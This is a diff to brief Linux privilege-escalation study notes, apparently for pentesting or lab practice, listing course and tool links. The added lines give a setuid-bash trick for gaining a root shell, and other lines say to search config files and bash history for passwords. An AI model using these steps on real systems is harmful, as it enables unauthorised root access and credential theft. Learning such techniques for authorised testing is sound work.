@@ -2,6 +2,14 @@ https://github.com/sagishahar/lpeworkshop
 http://udemy.com/course/linux-privilege-escalation-for-beginners
 https://github.com/mzet-/linux-exploit-suggester
 
+
+if can create suid file through cron job or python or whatever can use:
+
+cp /bin/bash /tmp/bash && chmod +s /tmp/bash 
+
+then run with /tmp/bash -p 
+
+
 check config files for passwords and username
 check bash_history for passwords and usernames entered
 check file permissions
